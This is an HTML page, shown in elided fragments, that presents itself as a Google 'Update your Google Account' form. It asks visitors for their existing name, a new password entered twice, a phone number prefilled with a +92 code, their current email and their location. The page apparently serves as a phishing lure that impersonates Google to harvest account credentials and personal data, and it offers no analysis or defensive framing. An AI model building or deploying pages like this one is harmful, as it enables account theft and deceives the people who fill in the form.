<html>
<head>
<title>Update your Google Account</title>
...
<tr>
<td><p id="cr1">Update your Google Account</p></td>
</tr></table>
<table width="100%">
...
<p>Old Name</p><input type="text" name="oldn" size="45" placeholder="ENTER EXISTING FRIST NAME" required>
  ...
  <p>Create a password</p><input size="45" type="password" name="crpass"  required>
  <p>Confirm your password</p><input size="45" type="password" name="cnpass" required>
  ...
  <p>Mobile phone</p><input size="45" type="text" name="ph" value="+92" required>
  <p>Your current email address</p><input size="45" type="email" name="crmail" required>
  <p>Location</p>
  <select name="locat">
  ...
  <p style="text-align:"center;"><input id="si2"type="submit" name="update" value="Update"></p>
  </form>
</td>
</tr>
</table>
